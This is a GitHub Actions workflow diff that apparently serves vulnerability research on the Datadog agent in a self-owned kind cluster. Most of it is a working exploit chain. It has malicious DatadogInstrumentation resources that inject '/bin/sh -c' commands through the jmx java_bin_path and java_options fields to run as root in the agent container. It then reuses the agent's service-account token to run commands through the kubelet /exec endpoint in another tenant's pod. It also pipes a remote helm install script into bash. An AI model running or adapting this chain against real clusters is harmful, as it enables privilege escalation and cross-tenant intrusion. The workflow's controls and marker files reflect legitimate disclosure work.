@@ -1,0 +1,564 @@
+name: dd-ddi-lab
+
+# Authorized self-owned lab (own kind cluster, own Datadog org, canary marker files).
+# Proves: DatadogInstrumentation CRD (provider instrumentation-checks, default chart 3.269.1)
+# delivers spec.config.checks to the node agent, and a jmx instance's java_bin_path/java_options
+# executes a command as uid 0 in the agent container even with
+# integration_ignore_untrusted_file_params: true. Then reuses the agent SA token against the
+# kubelet /exec in another namespace (control pair from the banked 9.9 report).
+#
+# Secrets required: DD_API_KEY, DD_APP_KEY (our own US1 org).
+
+on:
+  workflow_dispatch:
+    inputs:
+      agent_tag:
+        description: Datadog agent/cluster-agent image tag
+        default: "7.85.4"
+        required: false
+      chart_version:
+        description: Datadog helm chart version
+        default: "3.269.1"
+        required: false
+
+permissions:
+  contents: read
+
+jobs:
+  lab:
+    runs-on: ubuntu-latest
+    timeout-minutes: 50
+    env:
+      LAB: ${{ github.workspace }}/lab
+      AGENT_TAG: ${{ inputs.agent_tag }}
+      CHART_VERSION: ${{ inputs.chart_version }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Init workspace
+        run: |
+          set -eu
+          mkdir -p "$LAB/evidence"
+          echo "run=$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID" > "$LAB/evidence/00-run.txt"
+          echo "agent_tag=$AGENT_TAG chart_version=$CHART_VERSION" >> "$LAB/evidence/00-run.txt"
+
+      - name: Install kind, kubectl, helm
+        run: |
+          set -eu
+          curl -fsSLo kind https://kind.sigs.k8s.io/dl/v0.27.0/kind-linux-amd64 && chmod +x kind && sudo install -m0755 kind /usr/local/bin/kind
+          curl -fsSLo kubectl https://dl.k8s.io/release/v1.32.0/bin/linux/amd64/kubectl && chmod +x kubectl && sudo install -m0755 kubectl /usr/local/bin/kubectl
+          curl -fsSL https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash >/dev/null
+          { kind version; kubectl version --client; helm version; } | tee "$LAB/evidence/00-tools.txt"
+
+      - name: Create kind cluster
+        run: |
+          set -eu
+          cat > kind.yaml <<'EOF'
+          kind: Cluster
+          apiVersion: kind.x-k8s.io/v1alpha4
+          nodes:
+          - role: control-plane
+            image: kindest/node:v1.32.0
+          EOF
+          kind create cluster --name dd-ddi --config kind.yaml --wait 240s
+          kubectl get nodes -o wide | tee "$LAB/evidence/01-nodes.txt"
+          kubectl version | tee -a "$LAB/evidence/01-nodes.txt"
+
+      - name: Install Datadog chart 3.269.1 with defaults
+        env:
+          DD_API_KEY: ${{ secrets.DD_API_KEY }}
+          DD_APP_KEY: ${{ secrets.DD_APP_KEY }}
+        run: |
+          set -eu
+          umask 077
+          helm repo add datadog https://helm.datadoghq.com >/dev/null
+          helm repo update >/dev/null
+          cat > values.yaml <<'EOF'
+          registry: registry.datadoghq.com
+          datadog:
+            apiKey: __DD_API_KEY__
+            appKey: __DD_APP_KEY__
+            site: datadoghq.com
+            clusterName: dd-ddi-lab
+            env:
+              - name: DD_INTEGRATION_IGNORE_UNTRUSTED_FILE_PARAMS
+                value: "true"
+            instrumentationCrd:
+              enabled: true
+            kubelet:
+              tlsVerify: false
+            logs:
+              enabled: false
+            apm:
+              portEnabled: false
+            processAgent:
+              containerCollection: false
+              processCollection: false
+            orchestratorExplorer:
+              enabled: false
+          clusterAgent:
+            enabled: true
+            replicas: 1
+            image:
+              tag: __AGENT_TAG__
+          agents:
+            image:
+              tag: __AGENT_TAG__
+          EOF
+          sed -i "s|__DD_API_KEY__|$DD_API_KEY|; s|__DD_APP_KEY__|$DD_APP_KEY|; s|__AGENT_TAG__|$AGENT_TAG|g" values.yaml
+          cp values.yaml "$LAB/evidence/02-values.yaml.redacted"
+          sed -i 's|apiKey: .*|apiKey: REDACTED|; s|appKey: .*|appKey: REDACTED|' "$LAB/evidence/02-values.yaml.redacted"
+          helm install datadog-agent datadog/datadog --version "$CHART_VERSION" -f values.yaml -n datadog --create-namespace --wait --timeout 10m || true
+          kubectl -n datadog get pods -o wide | tee "$LAB/evidence/03-pods-install.txt" || true
+          kubectl -n datadog get deploy,ds | tee -a "$LAB/evidence/03-pods-install.txt" || true
+
+      - name: Wait for Cluster Agent and node agent
+        run: |
+          set -uo pipefail
+          for i in $(seq 1 60); do
+            RUNNING=$(kubectl -n datadog get pods --no-headers 2>/dev/null | grep -c Running || true)
+            DCA_READY=$(kubectl -n datadog get pods --no-headers 2>/dev/null | grep cluster-agent | grep -c Running || true)
+            AGENT_READY=$(kubectl -n datadog get pods --no-headers 2>/dev/null | grep -v cluster-agent | grep -c Running || true)
+            echo "t=${i} running=$RUNNING dca=$DCA_READY agent=$AGENT_READY"
+            if [ "${DCA_READY:-0}" -ge 1 ] && [ "${AGENT_READY:-0}" -ge 1 ]; then break; fi
+            sleep 10
+          done
+          kubectl -n datadog get pods -o wide | tee "$LAB/evidence/03-pods-ready.txt"
+
+      - name: "Evidence: CRD, env, RBAC, versions (no CR yet baseline)"
+        run: |
+          set -uo pipefail
+          {
+            echo "=== chart ==="; helm list -n datadog -o json || true
+            echo "=== crd ==="; kubectl get crd datadoginstrumentations.datadoghq.com -o custom-columns=NAME:.metadata.name,GROUP:.spec.group,SCOPE:.spec.scope,VERSIONS:.spec.versions[*].name 2>&1 || true
+            echo "=== api-resources ==="; kubectl api-resources 2>/dev/null | grep -i datadoginstrument || true
+            echo "=== crd checks schema snippet ==="; kubectl get crd datadoginstrumentations.datadoghq.com -o json 2>/dev/null | jq -c '.spec.versions[0].schema.openAPIV3Schema.properties.spec.properties.config.properties.checks.items.properties.instances // empty' || true
+          } | tee "$LAB/evidence/10-crd.txt"
+
+          AGENT_POD=$(kubectl -n datadog get pods --no-headers -o custom-columns=:metadata.name 2>/dev/null | grep -v cluster-agent | head -1)
+          DCA_POD=$(kubectl -n datadog get pods --no-headers -o custom-columns=:metadata.name 2>/dev/null | grep cluster-agent | head -1)
+          echo "AGENT_POD=$AGENT_POD" | tee "$LAB/evidence/11-env.txt"
+          echo "DCA_POD=$DCA_POD" | tee -a "$LAB/evidence/11-env.txt"
+          {
+            echo "=== agent image ==="; kubectl -n datadog get pod "$AGENT_POD" -o jsonpath='{.spec.containers[?(@.name=="agent")].image}{"\n"}' 2>&1 || true
+            kubectl -n datadog get pod "$AGENT_POD" -o jsonpath='{.status.containerStatuses[?(@.name=="agent")].imageID}{"\n"}' 2>&1 || true
+            echo "=== agent env (instrumentation / untrusted gate) ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'echo DD_INSTRUMENTATION_CRD_CONTROLLER_ENABLED=$DD_INSTRUMENTATION_CRD_CONTROLLER_ENABLED; echo DD_INTEGRATION_IGNORE_UNTRUSTED_FILE_PARAMS=$DD_INTEGRATION_IGNORE_UNTRUSTED_FILE_PARAMS' 2>&1 || true
+            echo "=== agent effective config ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- /opt/datadog-agent/bin/agent/agent config get integration_ignore_untrusted_file_params 2>&1 || true
+            echo "=== agent identity ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- id 2>&1 || true
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'echo proc1=$(cat /proc/1/comm); echo hostname=$(hostname)' 2>&1 || true
+            echo "=== agent SA ==="
+            kubectl -n datadog get pod "$AGENT_POD" -o jsonpath='{.spec.serviceAccountName}{"\n"}' 2>&1 || true
+            echo "=== DCA image ==="
+            kubectl -n datadog get pod "$DCA_POD" -o jsonpath='{.spec.containers[?(@.name=="cluster-agent")].image}{"\n"}' 2>&1 || true
+            echo "=== DCA env ==="
+            kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- printenv DD_INSTRUMENTATION_CRD_CONTROLLER_ENABLED 2>&1 || true
+            echo "=== DCA RBAC on datadoginstrumentations ==="
+            kubectl get clusterrole -o json 2>/dev/null | jq -r '.items[] | select(.metadata.name|test("datadog.*cluster-agent")) | .metadata.name as $n | .rules[] | select((.resources // []) | index("datadoginstrumentations")) | "\($n): \(.verbs|join(","))"' 2>&1 || true
+          } | tee -a "$LAB/evidence/11-env.txt"
+
+          echo "=== baseline marker (expect absent) ===" | tee "$LAB/evidence/12-baseline-marker.txt"
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/ddi-marker 2>&1; echo rc=$?' 2>&1 | tee -a "$LAB/evidence/12-baseline-marker.txt" || true
+
+      - name: Create namespaces, Deployments, evidence and victim pods
+        run: |
+          set -eu
+          for ns in ddi-atk ddi-ctl ddi-nobin ddi-other ddi-gate evidence tenant-b; do
+            kubectl create namespace "$ns" --dry-run=client -o yaml | kubectl apply -f - >/dev/null
+          done
+          # target workloads
+          kubectl -n ddi-atk create deployment app --image=nginx:1.27-alpine --replicas=1
+          kubectl -n ddi-atk create deployment app-b --image=nginx:1.27-alpine --replicas=1
+          kubectl -n ddi-ctl create deployment app --image=nginx:1.27-alpine --replicas=1
+          kubectl -n ddi-nobin create deployment app --image=nginx:1.27-alpine --replicas=1
+          kubectl -n ddi-other create deployment appx --image=nginx:1.27-alpine --replicas=1
+          kubectl -n ddi-gate create deployment app --image=nginx:1.27-alpine --replicas=1
+          # victim in another namespace, evidence shell pod
+          kubectl -n tenant-b run victim --image=busybox:1.36 --restart=Never --command -- sleep 3600
+          kubectl -n evidence run curl --image=curlimages/curl:8.10.1 --restart=Never --command -- sleep 3600
+          for d in ddi-atk/app ddi-atk/app-b ddi-ctl/app ddi-nobin/app ddi-other/appx ddi-gate/app; do
+            kubectl -n "${d%%/*}" rollout status "deploy/${d##*/}" --timeout=180s
+          done
+          kubectl -n tenant-b wait --for=condition=Ready pod/victim --timeout=180s
+          kubectl -n evidence wait --for=condition=Ready pod/curl --timeout=180s
+          kubectl get pods -A -o wide | grep -E "ddi-|tenant-b|evidence" | tee "$LAB/evidence/13-workloads.txt"
+
+      - name: "TEST 1: malicious DatadogInstrumentation CR (namespace ddi-atk, Deployment app)"
+        run: |
+          set -uo pipefail
+          cat > "$LAB/evidence/20-cr.yaml" <<'EOF'
+          apiVersion: datadoghq.com/v1alpha1
+          kind: DatadogInstrumentation
+          metadata:
+            name: ddi-rce
+            namespace: ddi-atk
+          spec:
+            targetRef:
+              apiVersion: apps/v1
+              kind: Deployment
+              name: app
+            config:
+              checks:
+                - integration: jmx
+                  containerName: app
+                  instances:
+                    - loader: jmx
+                      java_bin_path: /bin/sh
+                      java_options: "-c (id;hostname)>/tmp/ddi-marker"
+          EOF
+          kubectl apply -f "$LAB/evidence/20-cr.yaml" 2>&1 | tee "$LAB/evidence/20-apply.txt"
+          sleep 5
+          kubectl -n ddi-atk get datadoginstrumentation ddi-rce -o yaml 2>&1 | tee "$LAB/evidence/21-cr-status.txt" || true
+
+          AGENT_POD=$(kubectl -n datadog get pods --no-headers -o custom-columns=:metadata.name 2>/dev/null | grep -v cluster-agent | head -1)
+          echo "AGENT_POD=$AGENT_POD"
+
+          # Wait for the marker (poll up to 240s)
+          for i in $(seq 1 24); do
+            OUT=$(kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'cat /tmp/ddi-marker 2>/dev/null' 2>/dev/null || true)
+            if [ -n "$OUT" ]; then echo "marker appeared at t=$((i*10))s"; break; fi
+            sleep 10
+          done
+          {
+            echo "=== marker (expect present; uid 0) ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/ddi-marker 2>&1; stat -c "%u:%g %U:%G mode=%a" /tmp/ddi-marker 2>&1; echo "---content---"; cat /tmp/ddi-marker 2>&1; echo "---exec-identity---"; id' 2>&1 || true
+            echo "=== agent log: jmxfetch scheduling + provider ==="
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=20000 2>/dev/null | grep -aE "Scheduling jmxfetch config|Args:|instrumentation-checks|instrumentation_crd|ddi-marker|instrumentation check" | tail -40 || true
+            echo "=== agent log: any untrusted-provider rejection for jmx/java_* ==="
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=20000 2>/dev/null | grep -aiE "not allowed from untrusted|untrusted provider" | tail -20 || true
+          } | tee "$LAB/evidence/22-marker-and-agentlog.txt"
+
+      - name: "TEST 2: DCA serves the CR config (provider instrumentation-checks)"
+        run: |
+          set -uo pipefail
+          TOKEN=$(kubectl -n datadog get secrets -o json 2>/dev/null | jq -r '.items[] | select(.data.token != null) | .metadata.name' | head -1)
+          DCA_SECRET="$TOKEN"
+          TOKEN=$(kubectl -n datadog get secret "$DCA_SECRET" -o jsonpath='{.data.token}' 2>/dev/null | base64 -d)
+          echo "dca_secret=$DCA_SECRET token_len=${#TOKEN}" | tee "$LAB/evidence/30-dca-token.txt"
+          DCA_SVC=$(kubectl -n datadog get svc -o json 2>/dev/null | jq -r '.items[] | select(.metadata.name|test("cluster-agent")) | .metadata.name' | head -1)
+          echo "dca_svc=$DCA_SVC" | tee -a "$LAB/evidence/30-dca-token.txt"
+          URL="https://$DCA_SVC.datadog.svc:5005/api/v1/instrumentation/configs"
+          kubectl -n evidence exec curl -- curl -sk -m 20 -H "Authorization: Bearer $TOKEN" "$URL" > "$LAB/evidence/31-dca-configs.json" 2>&1 || true
+          echo "=== size ==="; wc -c "$LAB/evidence/31-dca-configs.json" | tee "$LAB/evidence/31-dca-configs-summary.txt"
+          python3 - <<'PY' | tee -a "$LAB/evidence/31-dca-configs-summary.txt"
+          import json
+          try:
+              d = json.load(open("lab/evidence/31-dca-configs.json"))
+          except Exception as e:
+              print("not-json:", e); raise SystemExit
+          print("config_hash:", d.get("config_hash"))
+          cfgs = d.get("configs") or []
+          print("config_count:", len(cfgs))
+          for c in cfgs:
+              print("---")
+              print("name:", c.get("name"), "provider:", c.get("provider"), "source:", c.get("source"))
+              print("ad_identifiers:", c.get("ad_identifiers"))
+              print("cel_selector:", json.dumps(c.get("cel_selector") or c.get("CelSelector") or {}))
+              print("instances:", json.dumps(c.get("instances"))[:600])
+          PY
+          echo "=== status endpoint ==="
+          kubectl -n evidence exec curl -- curl -sk -m 20 -H "Authorization: Bearer $TOKEN" "${URL%/configs}/status" | tee "$LAB/evidence/32-dca-status.json" || true
+          echo "=== DCA logs for the CR ==="
+          DCA_POD=$(kubectl -n datadog get pods --no-headers -o custom-columns=:metadata.name 2>/dev/null | grep cluster-agent | head -1)
+          kubectl -n datadog logs "$DCA_POD" -c cluster-agent --tail=4000 2>/dev/null | grep -aiE "DatadogInstrumentation|instrumentation|ddi-rce|checks handler" | tail -30 | tee "$LAB/evidence/33-dca-logs.txt" || true
+
+      - name: "CONTROL A: same CR shape with integration nginx (expect no marker)"
+        run: |
+          set -uo pipefail
+          cat > ctl-nginx.yaml <<'EOF'
+          apiVersion: datadoghq.com/v1alpha1
+          kind: DatadogInstrumentation
+          metadata:
+            name: ddi-nginx
+            namespace: ddi-ctl
+          spec:
+            targetRef:
+              apiVersion: apps/v1
+              kind: Deployment
+              name: app
+            config:
+              checks:
+                - integration: nginx
+                  containerName: app
+                  instances:
+                    - nginx_status_url: http://127.0.0.1:8080/status
+                      java_bin_path: /bin/sh
+                      java_options: "-c id>/tmp/ddi-marker-nginx"
+          EOF
+          kubectl apply -f ctl-nginx.yaml 2>&1 | tee "$LAB/evidence/40-control-nginx.txt"
+          sleep 60
+          AGENT_POD=$(kubectl -n datadog get pods --no-headers -o custom-columns=:metadata.name 2>/dev/null | grep -v cluster-agent | head -1)
+          {
+            echo "marker-nginx (expect absent):"
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/ddi-marker-nginx 2>&1; echo rc=$?' 2>&1 || true
+            echo "agent log (nginx check, no jmxfetch):"
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=8000 2>/dev/null | grep -aE "ddi-nginx|nginx|jmxfetch" | tail -10 || true
+          } | tee -a "$LAB/evidence/40-control-nginx.txt"
+
+      - name: "CONTROL B: jmx without java_bin_path (expect no marker)"
+        run: |
+          set -uo pipefail
+          cat > ctl-nobin.yaml <<'EOF'
+          apiVersion: datadoghq.com/v1alpha1
+          kind: DatadogInstrumentation
+          metadata:
+            name: ddi-nobin
+            namespace: ddi-nobin
+          spec:
+            targetRef:
+              apiVersion: apps/v1
+              kind: Deployment
+              name: app
+            config:
+              checks:
+                - integration: jmx
+                  containerName: app
+                  instances:
+                    - loader: jmx
+                      java_options: "-c id>/tmp/ddi-marker-nobin"
+          EOF
+          kubectl apply -f ctl-nobin.yaml 2>&1 | tee "$LAB/evidence/41-control-nobin.txt"
+          sleep 60
+          AGENT_POD=$(kubectl -n datadog get pods --no-headers -o custom-columns=:metadata.name 2>/dev/null | grep -v cluster-agent | head -1)
+          {
+            echo "marker-nobin (expect absent):"
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/ddi-marker-nobin 2>&1; echo rc=$?' 2>&1 || true
+            echo "agent log for ddi-nobin:"
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=12000 2>/dev/null | grep -aE "ddi-nobin|jmxfetch|java_bin_path|executable file not found" | tail -15 || true
+          } | tee -a "$LAB/evidence/41-control-nobin.txt"
+
+      - name: "CONTROL C: CR in ddi-atk targeting Deployment in another namespace (expect no marker)"
+        run: |
+          set -uo pipefail
+          cat > ctl-cross.yaml <<'EOF'
+          apiVersion: datadoghq.com/v1alpha1
+          kind: DatadogInstrumentation
+          metadata:
+            name: ddi-cross
+            namespace: ddi-atk
+          spec:
+            targetRef:
+              apiVersion: apps/v1
+              kind: Deployment
+              name: appx
+            config:
+              checks:
+                - integration: jmx
+                  containerName: app
+                  instances:
+                    - loader: jmx
+                      java_bin_path: /bin/sh
+                      java_options: "-c id>/tmp/ddi-marker-cross"
+          EOF
+          kubectl apply -f ctl-cross.yaml 2>&1 | tee "$LAB/evidence/42-control-cross.txt"
+          sleep 60
+          AGENT_POD=$(kubectl -n datadog get pods --no-headers -o custom-columns=:metadata.name 2>/dev/null | grep -v cluster-agent | head -1)
+          {
+            echo "marker-cross (expect absent; CEL pins container.pod.namespace to the CR namespace):"
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/ddi-marker-cross 2>&1; echo rc=$?' 2>&1 || true
+          } | tee -a "$LAB/evidence/42-control-cross.txt"
+
+      - name: "CONTROL D: untrusted-file-param gate liveness on this provider (glusterfs gstatus_path)"
+        run: |
+          set -uo pipefail
+          cat > ctl-gate.yaml <<'EOF'
+          apiVersion: datadoghq.com/v1alpha1
+          kind: DatadogInstrumentation
+          metadata:
+            name: ddi-gate
+            namespace: ddi-gate
+          spec:
+            targetRef:
+              apiVersion: apps/v1
+              kind: Deployment
+              name: app
+            config:
+              checks:
+                - integration: glusterfs
+                  containerName: app
+                  initConfig:
+                    gstatus_path: /nonexistent-ddi-control
+                  instances:
+                    - {}
+          EOF
+          kubectl apply -f ctl-gate.yaml 2>&1 | tee "$LAB/evidence/43-control-gate.txt"
+          sleep 45
+          AGENT_POD=$(kubectl -n datadog get pods --no-headers -o custom-columns=:metadata.name 2>/dev/null | grep -v cluster-agent | head -1)
+          {
+            echo "=== gate message for glusterfs gstatus_path (either provider name or absence is evidence) ==="
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=20000 2>/dev/null | grep -aiE "not allowed from untrusted|untrusted provider|gstatus_path|ddi-gate|glusterfs" | tail -25 || true
+          } | tee -a "$LAB/evidence/43-control-gate.txt"
+
+      - name: "RBAC DIFFERENTIAL: SA with create-only on datadoginstrumentations"
+        run: |
+          set -uo pipefail
+          cat > rbac.yaml <<'EOF'
+          apiVersion: v1
+          kind: ServiceAccount
+          metadata:
+            name: ddi-author
+            namespace: ddi-atk
+          ---
+          apiVersion: rbac.authorization.k8s.io/v1
+          kind: Role
+          metadata:
+            name: ddi-cr-author
+            namespace: ddi-atk
+          rules:
+            - apiGroups: ["datadoghq.com"]
+              resources: ["datadoginstrumentations"]
+              verbs: ["create"]
+          ---
+          apiVersion: rbac.authorization.k8s.io/v1
+          kind: RoleBinding
+          metadata:
+            name: ddi-cr-author
+            namespace: ddi-atk
+          subjects:
+            - kind: ServiceAccount
+              name: ddi-author
+              namespace: ddi-atk
+          roleRef:
+            kind: Role
+            name: ddi-cr-author
+            apiGroup: rbac.authorization.k8s.io
+          EOF
+          kubectl apply -f rbac.yaml 2>&1 | tee "$LAB/evidence/50-rbac-setup.txt"
+          {
+            echo "=== can-i matrix as system:serviceaccount:ddi-atk:ddi-author ==="
+            for verb_res in "create datadoginstrumentations.datadoghq.com" "create pods" "create deployments" "get secrets" "create datadoginstrumentations/status.datadoghq.com"; do
+              set -- $verb_res
+              printf "%s %s -> " "$1" "$2"
+              kubectl -n ddi-atk auth can-i "$1" "$2" --as=system:serviceaccount:ddi-atk:ddi-author 2>&1 || true
+            done
+            echo "=== control: same SA cannot create a pod (direct) ==="
+            kubectl -n ddi-atk run pwn --image=busybox --restart=Never --command -- sleep 1 --as=system:serviceaccount:ddi-atk:ddi-author 2>&1 || true
+          } | tee "$LAB/evidence/51-rbac-can-i.txt"
+
+          cat > rbac-cr.yaml <<'EOF'
+          apiVersion: datadoghq.com/v1alpha1
+          kind: DatadogInstrumentation
+          metadata:
+            name: ddi-rbac
+            namespace: ddi-atk
+          spec:
+            targetRef:
+              apiVersion: apps/v1
+              kind: Deployment
+              name: app-b
+            config:
+              checks:
+                - integration: jmx
+                  containerName: app
+                  instances:
+                    - loader: jmx
+                      java_bin_path: /bin/sh
+                      java_options: "-c (id;hostname)>/tmp/ddi-marker-rbac"
+          EOF
+          kubectl create -f rbac-cr.yaml --as=system:serviceaccount:ddi-atk:ddi-author 2>&1 | tee -a "$LAB/evidence/51-rbac-can-i.txt"
+          AGENT_POD=$(kubectl -n datadog get pods --no-headers -o custom-columns=:metadata.name 2>/dev/null | grep -v cluster-agent | head -1)
+          for i in $(seq 1 18); do
+            OUT=$(kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'cat /tmp/ddi-marker-rbac 2>/dev/null' 2>/dev/null || true)
+            if [ -n "$OUT" ]; then echo "rbac marker at t=$((i*10))s"; break; fi
+            sleep 10
+          done
+          {
+            echo "=== marker-rbac (expect present; created by a create-only SA) ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/ddi-marker-rbac 2>&1; stat -c "%u:%g %U:%G" /tmp/ddi-marker-rbac 2>&1; echo "---content---"; cat /tmp/ddi-marker-rbac 2>&1' 2>&1 || true
+            echo "=== CR as authored by the SA ==="
+            kubectl -n ddi-atk get datadoginstrumentation ddi-rbac -o yaml 2>&1 | head -60 || true
+          } | tee "$LAB/evidence/52-rbac-marker.txt"
+
+      - name: "ESCALATION LEG: agent SA token -> kubelet /exec in tenant-b"
+        run: |
+          set -uo pipefail
+          AGENT_POD=$(kubectl -n datadog get pods --no-headers -o custom-columns=:metadata.name 2>/dev/null | grep -v cluster-agent | head -1)
+          NODE_IP=$(kubectl -n datadog get pod "$AGENT_POD" -o jsonpath='{.status.hostIP}')
+          SA=$(kubectl -n datadog get pod "$AGENT_POD" -o jsonpath='{.spec.serviceAccountName}')
+          DCA_POD=$(kubectl -n datadog get pods --no-headers -o custom-columns=:metadata.name 2>/dev/null | grep cluster-agent | head -1)
+          echo "agent_pod=$AGENT_POD node_ip=$NODE_IP sa=$SA" | tee "$LAB/evidence/60-kubelet-meta.txt"
+          echo "=== can-i as the agent SA ===" | tee -a "$LAB/evidence/60-kubelet-meta.txt"
+          for r in "get nodes/proxy" "list pods" "get secrets" "create pods"; do
+            set -- $r
+            printf "%s %s -> " "$1" "$2"
+            kubectl auth can-i "$1" "$2" --as="system:serviceaccount:datadog:$SA" 2>&1 || true
+          done | tee -a "$LAB/evidence/60-kubelet-meta.txt"
+
+          cat > probe.sh <<'SH'
+          #!/bin/sh
+          # $1 node ip, $2 victim namespace, $3 victim pod, $4 container
+          NODE_IP="$1"; NS="$2"; POD="$3"; CTR="$4"
+          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          echo "agent_container_identity=$(id -u):$(id -g) $(id -un 2>/dev/null)"
+          echo "token_len=${#TOKEN}"
+          python3 - "$TOKEN" <<'PY' 2>/dev/null || true
+          import sys, base64, json
+          t = sys.argv[1].split('.')
+          if len(t) >= 2:
+              p = t[1] + '=' * (-len(t[1]) % 4)
+              d = json.loads(base64.urlsafe_b64decode(p))
+              print("token_sub=", d.get("sub"), "ns=", d.get("kubernetes.io", {}).get("namespace"), "sa=", d.get("kubernetes.io", {}).get("serviceaccount", {}).get("name"))
+          PY
+          URL="https://$NODE_IP:10250/exec/$NS/$POD/$CTR"
+          which curl >/dev/null 2>&1 && HAVE_CURL=1 || HAVE_CURL=0
+          echo "have_curl=$HAVE_CURL"
+          if [ "$HAVE_CURL" = "1" ]; then
+            echo "=== GET /exec (agent token) ==="
+            curl -sk -m 20 --get -H "Authorization: Bearer $TOKEN" \
+              --data-urlencode "command=id" --data-urlencode "command=hostname" \
+              --data-urlencode "stdout=true" --data-urlencode "stderr=true" "$URL" 2>&1 | head -c 4000
+            echo
+            echo "=== POST /exec (agent token; expect 403) ==="
+            curl -sk -m 20 -o /dev/null -w "http=%{http_code}\n" -X POST -H "Authorization: Bearer $TOKEN" "$URL" 2>&1 || true
+            echo "=== GET /exec (no token; expect 401) ==="
+            curl -sk -m 20 -o /dev/null -w "http=%{http_code}\n" --get --data-urlencode "command=id" --data-urlencode "stdout=true" "$URL" 2>&1 || true
+          else
+            python3 - "$TOKEN" "$URL" <<'PY' || true
+          import sys, ssl, urllib.request, urllib.parse
+          token, url = sys.argv[1], sys.argv[2]
+          q = urllib.parse.urlencode([("command","id"),("command","hostname"),("stdout","true"),("stderr","true")])
+          ctx = ssl._create_unverified_context()
+          try:
+              req = urllib.request.Request(url+"?"+q, headers={"Authorization":"Bearer "+token})
+              print(urllib.request.urlopen(req, context=ctx, timeout=20).read().decode()[:4000])
+          except Exception as e:
+              print("GET err:", repr(e))
+          try:
+              req = urllib.request.Request(url, headers={"Authorization":"Bearer "+token}, method="POST")
+              urllib.request.urlopen(req, context=ctx, timeout=20)
+              print("POST http=200 (unexpected)")
+          except Exception as e:
+              print("POST err:", repr(e))
+          try:
+              req = urllib.request.Request(url+"?"+q, method="GET")
+              urllib.request.urlopen(req, context=ctx, timeout=20)
+              print("NOTOKEN http=200 (unexpected)")
+          except Exception as e:
+              print("NOTOKEN err:", repr(e))
+          PY
+          fi
+          SH
+          kubectl -n datadog exec -i "$AGENT_POD" -c agent -- sh -c 'cat > /tmp/ddi_probe.sh' < probe.sh
+          kubectl -n tenant-b get pod victim -o jsonpath='{.status.podIP}{" "}{.spec.containers[0].name}{"\n"}' | tee -a "$LAB/evidence/60-kubelet-meta.txt"
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh /tmp/ddi_probe.sh "$NODE_IP" tenant-b victim victim 2>&1 | tee "$LAB/evidence/61-kubelet-exec.txt"
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- rm -f /tmp/ddi_probe.sh 2>/dev/null || true
+
+      - name: Cleanup
+        if: always()
+        run: |
+          set -uo pipefail
+          {
+            kubectl delete datadoginstrumentation --all -A --wait=false 2>&1 || true
+            kubectl delete namespace ddi-atk ddi-ctl ddi-nobin ddi-other ddi-gate evidence tenant-b --wait=false 2>&1 || true
+            kind delete cluster --name dd-ddi 2>&1 || true
+          } | tee "$LAB/evidence/99-cleanup.txt"
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ddi-evidence
+          path: lab/evidence
+          if-no-files-found: warn
